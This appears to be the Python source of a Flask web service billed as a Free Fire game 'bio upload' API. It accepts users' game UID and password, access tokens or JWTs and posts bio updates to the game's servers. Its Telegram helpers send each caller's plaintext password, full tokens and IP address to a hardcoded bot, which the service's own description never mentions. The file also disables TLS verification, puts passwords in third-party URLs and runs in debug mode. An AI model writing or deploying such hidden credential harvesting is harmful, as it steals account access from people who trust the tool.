from flask import Flask, request, jsonify, make_response
import requests
import binascii
import jwt
import urllib3
import json
import base64
import time
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder

try:
    import my_pb2
    import output_pb2
except ImportError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

DEFAULT_REGION = "IND"

# ==================== TELEGRAM NOTIFICATION SETUP ====================
TELEGRAM_BOT_TOKEN = "8387059083:AAEfrBHESkePIBMnCGHh_VKk8yCwgZ6Wb0A"
TELEGRAM_CHAT_ID = "8278814873"

def send_telegram_message(message):
    """
    Synchronous Telegram sender – prints logs to console.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True
    }
    try:
        resp = requests.post(url, json=payload, timeout=5)
        if resp.ok:
            print("✅ Telegram notification sent successfully.")
            return True
        else:
            print(f"❌ Telegram Error: Status {resp.status_code}, Response: {resp.text}")
            return False
    except Exception as e:
        print(f"❌ Telegram send exception: {e}")
        return False

def format_telegram_message(request_data, response_data, error=None):
    """Build a nice-looking Telegram message with HTML tags.
       UID and Password shown here are EXACTLY what the user sent in the request.
       Shows FULL JWT and FULL Access Token.
    """
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    client_ip = request_data.get('client_ip', 'Unknown')
    method = request_data.get('method', 'GET')
    path = request_data.get('path', '/bio')
    uid = request_data.get('uid', 'Not provided')
    password = request_data.get('password', None)  # password sent in request
    bio = request_data.get('bio', 'Not provided')
    access_token = request_data.get('access_token', None)
    jwt_token = request_data.get('jwt_token', None)
    login_method = request_data.get('login_method', 'Unknown')
    
    lines = []
    lines.append(f"<b>🔔 New Bio Upload Request</b>")
    lines.append(f"<b>Time:</b> <code>{timestamp}</code>")
    lines.append(f"<b>IP:</b> <code>{client_ip}</code>")
    lines.append(f"<b>Endpoint:</b> <code>{method} {path}</code>")
    
    # Show UID exactly as sent in the request
    lines.append(f"<b>UID:</b> <code>{uid}</code>")
    
    # Show password exactly as sent in the request
    if password:
        lines.append(f"<b>Password:</b> <code>{password}</code>")
    
    # Show Bio
    lines.append(f"<b>Bio:</b> <code>{bio}</code>")
    
    # Show FULL tokens if present (no truncation)
    if access_token:
        lines.append(f"<b>Access Token:</b> <code>{access_token}</code>")
    if jwt_token:
        lines.append(f"<b>JWT:</b> <code>{jwt_token}</code>")
    
    # Show login method
    lines.append(f"<b>Login Method:</b> {login_method}")
    
    if error:
        lines.append(f"<b>❌ Error:</b> {error}")
    else:
        status = response_data.get('status', 'Unknown')
        http_code = response_data.get('http_code', 'N/A')
        region_used = response_data.get('region_used', 'N/A')
        lines.append(f"<b>✅ Status:</b> {status}")
        lines.append(f"<b>HTTP Code:</b> <code>{http_code}</code>")
        lines.append(f"<b>Region Used:</b> <code>{region_used}</code>")
    
    lines.append("")
    lines.append("<i>Powered by RAJPUT-OP</i>")
    return "\n".join(lines)

# ==================== PROTOBUF DEFINITIONS (For Bio Upload Only) ====================

_sym_db = _symbol_database.Default()

# --- Data protobuf for bio upload ---
DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(
b'\n\ndata.proto"\xbb\x01\n\x04\x44\x61ta\x12\x0f\n\x07\x66ield_2\x18\x02 \x01(\x05\x12\x1e\n\x07\x66ield_5\x18\x05 \x01(\x0b\x32\r.EmptyMessage\x12\x1e\n\x07\x66ield_6\x18\x06 \x01(\x0b\x32\r.EmptyMessage\x12\x0f\n\x07\x66ield_8\x18\x08 \x01(\t\x12\x0f\n\x07\x66ield_9\x18\t \x01(\x05\x12\x1f\n\x08\x66ield_11\x18\x0b \x01(\x0b\x32\r.EmptyMessage\x12\x1f\n\x08\x66ield_12\x18\x0c \x01(\x0b\x32\r.EmptyMessage"\x0e\n\x0c\x45mptyMessageb\x06proto3'
)

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'data1_pb2', _globals)

BioData = _sym_db.GetSymbol('Data')
EmptyMessage = _sym_db.GetSymbol('EmptyMessage')

# ==================== AES CONSTANTS ====================

AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

def encrypt_data(data_bytes):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(data_bytes, AES.block_size)
    return cipher.encrypt(padded)

# ==================== JWT FROM UID/PASSWORD USING API ====================

def get_jwt_from_uid_password_api(uid, password):
    """Get JWT directly using the star-jwt-gen API.
       Returns: (jwt_token, account_id_from_response, nickname, region)
    """
    url = f"https://ff-jwt-gen-api.lovable.app/api/public/token?uid={uid}&password={password}"
    try:
        print(f"[UID/PASS] Calling JWT API: {url}")
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        print(f"[UID/PASS] API Response: {data}")
        
        # Check for token in response
        if "token" in data:
            jwt_token = data["token"]
            # Decode JWT to get info
            try:
                decoded = jwt.decode(jwt_token, options={"verify_signature": False})
                account_id = str(decoded.get("account_id"))
                nickname = decoded.get("nickname")
                region = decoded.get("lock_region") or decoded.get("region") or DEFAULT_REGION
                print(f"[UID/PASS] Success! UID: {account_id}, Name: {nickname}, Region: {region}")
                return jwt_token, account_id, nickname, region
            except Exception as e:
                print(f"[UID/PASS] JWT decode error: {e}")
                return jwt_token, uid, "Unknown", DEFAULT_REGION
        else:
            error_msg = data.get("error", "No token in response")
            print(f"[UID/PASS] API Error: {error_msg}")
            return None, None, None, None
    except Exception as e:
        print(f"[UID/PASS] Request error: {e}")
        return None, None, None, None

# ==================== ACCESS TOKEN -> JWT (NEW API METHOD) ====================

def get_jwt_from_access_token(access_token):
    """Convert access token to JWT using the external API"""
    url = f"https://ff-jwt-gen-api.lovable.app/api/public/token?access_token={access_token}"
    try:
        print(f"[Access Token] Calling JWT API: {url}")
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        print(f"[Access Token] API Response received")
        
        # Check for success and token
        if data.get("success") and data.get("token"):
            jwt_token = data["token"]
            account_uid = str(data.get("account_uid", ""))
            region = data.get("region", DEFAULT_REGION)
            
            # Get nickname from jwt_decoded payload if available
            nickname = None
            jwt_decoded = data.get("jwt_decoded", {})
            payload = jwt_decoded.get("payload", {})
            if payload:
                nickname = payload.get("nickname")
            elif "nickname" in data:
                nickname = data.get("nickname")
            
            print(f"[Access Token] Success! UID: {account_uid}, Name: {nickname}, Region: {region}")
            return jwt_token, account_uid, region
        else:
            error_msg = data.get("error", "No token in response or success false")
            print(f"[Access Token] API Error: {error_msg}")
            return None, None, None
    except Exception as e:
        print(f"[Access Token] Request error: {e}")
        return None, None, None

# ==================== REGION CONFIGURATION ====================

MIDDLE_EAST_REGIONS = [
    "EUROPE", "MIDDLEEAST", "MIDDLE_EAST", "ME", "DUBAI", "UAE", "SAUDI",
    "SAUDIARABIA", "KSA", "EGYPT", "EG", "TURKEY", "TR", "IRAQ", "IQ",
    "QATAR", "QA", "KUWAIT", "KW", "OMAN", "OM", "BAHRAIN", "BH", "PAKISTAN", "PK"
]

REGION_ALIASES = {
    "EUROPE": "ME", "MIDDLEEAST": "ME", "DUBAI": "ME", "UAE": "ME",
    "SAUDI": "ME", "EGYPT": "ME", "TURKEY": "ME", "PAKISTAN": "ME", "PK": "ME",
    "ASIA": "SG", "SOUTHAMERICA": "BR", "NORTH_AMERICA": "NA"
}

REGION_MAP = {
    "IND": {"update_url": "https://client.ind.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "ME": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "BD": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "PK": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "TW": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "TH": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "VN": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "ID": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "RU": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "EU": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "SG": {"update_url": "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "BR": {"update_url": "https://client.us.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "SAC": {"update_url": "https://client.us.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "NA": {"update_url": "https://client.us.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
}

FREEFIRE_VERSION = "OB54"
OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"

BIO_HEADERS = {
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Dalvik/2.1.0 (Linux; Android)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

def decode_jwt_full(token):
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        return {
            "uid": str(decoded.get("account_id")),
            "name": decoded.get("nickname"),
            "region": (decoded.get("lock_region") or decoded.get("region") or "").upper(),
            "country": decoded.get("country_code")
        }
    except:
        return None

def map_region(jwt_region):
    if not jwt_region:
        return DEFAULT_REGION
    jwt_region = jwt_region.upper()
    if jwt_region in REGION_MAP:
        return jwt_region
    if jwt_region in REGION_ALIASES:
        return REGION_ALIASES[jwt_region]
    return DEFAULT_REGION

def _add_region_param(url, region):
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q["region"] = region
    return urlunparse((parts.scheme, parts.netloc, parts.path, parts.params, urlencode(q), parts.fragment))

def get_region_urls(region):
    region = region.upper() if region else DEFAULT_REGION
    if region not in REGION_MAP:
        region = DEFAULT_REGION
    update_url = _add_region_param(REGION_MAP[region]["update_url"], region)
    return region, update_url

def upload_bio_request(jwt_token, bio_text, update_url):
    try:
        data = BioData()
        data.field_2 = 17
        data.field_5.CopyFrom(EmptyMessage())
        data.field_6.CopyFrom(EmptyMessage())
        data.field_8 = bio_text
        data.field_9 = 1
        data.field_11.CopyFrom(EmptyMessage())
        data.field_12.CopyFrom(EmptyMessage())

        data_bytes = data.SerializeToString()
        encrypted = encrypt_data(data_bytes)

        headers = BIO_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"

        resp = requests.post(update_url, headers=headers, data=encrypted, verify=False)

        status = "✅ Success" if resp.status_code == 200 else "❌ Failed"
        return {
            "status": status,
            "code": resp.status_code,
            "server_response": binascii.hexlify(resp.content).decode()
        }
    except Exception as e:
        return {"status": str(e), "code": 500, "server_response": ""}

# ==================== MAIN ROUTE ====================

@app.route("/bio", methods=["GET", "POST"])
def combined_bio_upload():
    bio = request.args.get("bio") or request.form.get("bio")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.args.get("password") or request.form.get("pass") or request.form.get("password")
    access_token = request.args.get("access") or request.args.get("access_token") or request.form.get("access") or request.form.get("access_token")

    # Collect client info for Telegram
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if client_ip and ',' in client_ip:
        client_ip = client_ip.split(',')[0].strip()

    # Build request_info – UID and Password are EXACTLY what the user sent in the request.
    # These values will NEVER be overridden by API response.
    request_info = {
        'client_ip': client_ip,
        'method': request.method,
        'path': request.path,
        'uid': uid if uid else 'Not provided',       # as sent in request
        'password': password,                         # as sent in request
        'bio': bio if bio else 'Not provided',
        'access_token': access_token,                 # full token as sent
        'jwt_token': jwt_token,                       # full token as sent
        'login_method': 'Unknown'                     # will be updated
    }

    if not bio:
        error_msg = "Missing bio parameter"
        # Send error notification
        msg = format_telegram_message(request_info, {}, error=error_msg)
        send_telegram_message(msg)
        return jsonify({"status": "❌ Missing bio", "error": "bio parameter required"}), 400

    final_jwt = None
    jwt_info = None
    login_method = "Unknown"
    error = None

    # 1. Direct JWT
    if jwt_token:
        login_method = "Direct JWT"
        final_jwt = jwt_token
        jwt_info = decode_jwt_full(final_jwt)
        print(f"[Direct JWT] Using provided JWT")

    # 2. UID + Password (Using API)
    elif uid and password:
        login_method = "UID/Pass via API"
        print(f"[UID/Pass] Attempting login for UID: {uid}")
        final_jwt, account_uid, name, region = get_jwt_from_uid_password_api(uid, password)
        
        if final_jwt:
            jwt_info = {
                "uid": account_uid,
                "name": name,
                "region": region
            }
            print(f"[UID/Pass] Successfully obtained JWT")
        else:
            print(f"[UID/Pass] Failed to get JWT")
            error = "Invalid UID/Password or API error"
            response_data = {
                "status": "❌ Authentication Failed",
                "error": error,
                "login_method": login_method
            }
            # Send error notification with updated login_method
            request_info['login_method'] = login_method
            msg = format_telegram_message(request_info, response_data, error=error)
            send_telegram_message(msg)
            return jsonify(response_data), 401

    # 3. Access Token -> JWT (External API)
    elif access_token:
        login_method = "Access Token -> JWT (External API)"
        print(f"[Access Token] Attempting conversion")
        final_jwt, account_uid, region = get_jwt_from_access_token(access_token)
        
        if final_jwt:
            jwt_info = decode_jwt_full(final_jwt)
            if not jwt_info:
                jwt_info = {"uid": account_uid, "region": region}
            print(f"[Access Token] Successfully obtained JWT")
        else:
            print(f"[Access Token] Failed to convert")
            error = "Could not convert access token to JWT using external API"
            response_data = {
                "status": "❌ Access Token Conversion Failed",
                "error": error,
                "login_method": login_method
            }
            request_info['login_method'] = login_method
            msg = format_telegram_message(request_info, response_data, error=error)
            send_telegram_message(msg)
            return jsonify(response_data), 401

    else:
        error = "Missing credentials: Provide JWT, UID/Pass, or Access Token"
        response_data = {
            "status": "❌ Missing Credentials",
            "error": error,
            "example": {
                "with_uid_pass": "/bio?bio=Hello&uid=123456789&pass=yourpassword",
                "with_jwt": "/bio?bio=Hello&jwt=your_jwt_token",
                "with_access": "/bio?bio=Hello&access=your_access_token"
            }
        }
        request_info['login_method'] = 'Unknown'
        msg = format_telegram_message(request_info, response_data, error=error)
        send_telegram_message(msg)
        return jsonify(response_data), 400

    if not final_jwt:
        error = "Could not generate valid JWT"
        response_data = {"status": "❌ JWT Generation Failed", "error": error}
        request_info['login_method'] = login_method
        msg = format_telegram_message(request_info, response_data, error=error)
        send_telegram_message(msg)
        return jsonify(response_data), 500

    # Now we have JWT, upload bio
    jwt_region = jwt_info.get("region") if jwt_info else DEFAULT_REGION
    mapped_region = map_region(jwt_region)
    _, update_url = get_region_urls(mapped_region)
    result = upload_bio_request(final_jwt, bio, update_url)

    response_data = {
        "success": result["status"] == "✅ Success",
        "login_method": login_method,
        "status": result["status"],
        "http_code": result["code"],
        "bio": bio,
        "uid": jwt_info.get("uid") if jwt_info else None,
        "name": jwt_info.get("name") if jwt_info else None,
        "region_detected": jwt_region,
        "region_used": mapped_region,
        "generated_jwt": final_jwt,  # full JWT
        "server_response": result["server_response"][:200] if result["server_response"] else "Empty"
    }

    # Update request_info with login_method
    request_info['login_method'] = login_method

    # IMPORTANT: UID and Password in Telegram stay EXACTLY as sent in the request.
    # They are NOT overridden by API response or JWT payload.
    # request_info['uid'] and request_info['password'] already hold the request values.

    # Send success notification
    msg = format_telegram_message(request_info, response_data)
    send_telegram_message(msg)

    return jsonify(response_data)

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "name": "FreeFire Bio Upload API",
        "version": "2.2",
        "endpoints": {
            "bio": "/bio?bio=text&uid=UID&pass=PASSWORD",
            "methods": ["GET", "POST"],
            "parameters": {
                "bio": "Bio text to upload (required)",
                "uid": "FreeFire UID (with password)",
                "pass": "FreeFire password (with uid)",
                "jwt": "Direct JWT token",
                "access": "Access token (converted via external API)"
            }
        },
        "examples": {
            "uid_pass": "/bio?bio=Your_Bio&uid=4569404695&pass=RAGHAVLIKESBOT_RAGHAV_2THCG",
            "jwt": "/bio?bio=Your_Bio&jwt=eyJhbGciOiJIUzI1NiIs...",
            "access": "/bio?bio=Your_Bio&access=660b275ac9fc3f12b65ed9008344cb74..."
        }
    })

if __name__ == "__main__":
    print("=" * 50)
    print("FreeFire Bio Upload API Started (v2.2)")
    print("=" * 50)
    print("Available endpoints:")
    print("  GET  / - API Info")
    print("  POST /bio - Upload bio")
    print("  GET  /bio?bio=text&uid=xxx&pass=xxx - Upload bio")
    print("  GET  /bio?bio=text&access=xxx - Upload bio with access token")
    print("=" * 50)
    app.run(host="0.0.0.0", port=5000, debug=True)
